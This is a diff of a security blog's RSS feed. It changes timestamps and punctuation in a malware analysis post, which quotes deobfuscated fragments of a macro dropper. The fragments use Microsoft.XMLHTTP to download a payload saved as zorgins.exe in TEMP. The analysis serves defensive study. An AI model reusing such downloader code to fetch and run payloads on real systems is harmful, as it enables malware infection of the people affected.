@@ -6,8 +6,8 @@
 </description>
     <link>https://spreadsecurity.github.io//</link>
     <atom:link href="https://spreadsecurity.github.io//feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 14 Aug 2016 11:13:58 +0200</pubDate>
-    <lastBuildDate>Sun, 14 Aug 2016 11:13:58 +0200</lastBuildDate>
+    <pubDate>Sun, 14 Aug 2016 11:18:38 +0200</pubDate>
+    <lastBuildDate>Sun, 14 Aug 2016 11:18:38 +0200</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
     
       <item>
@@ -148,7 +148,7 @@ InTheAfrikaMountainsAreHighGMAKO.Open (InTheAfrikaMountainsAreHighUUUKA) # = Cre
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;It is clear now that zorgins.exe is saved in TEMP directory; moreover in the following snippet we have the HTTP GET request for a url (malware download) which is marked as “InTheAfrikaMountainsAreHigh4”:&lt;/p&gt;
+&lt;p&gt;It is clear now that “zorgins.exe” is saved in TEMP directory; moreover in the following snippet we have the HTTP GET request for a url (malware download) which is marked as “InTheAfrikaMountainsAreHigh4”:&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;InTheAfrikaMountainsAreHighDAcdaw.Open InTheAfrikaMountainsAreHighPLAPEKC(5), InTheAfrikaMountainsAreHigh4, False # = CreateObject(Microsoft.XMLHTTP).Open GeT, InTheAfrikaMountainsAreHigh4, False
 InTheAfrikaMountainsAreHighDAcdaw.Send # = CreateObject(Microsoft.XMLHTTP).Send
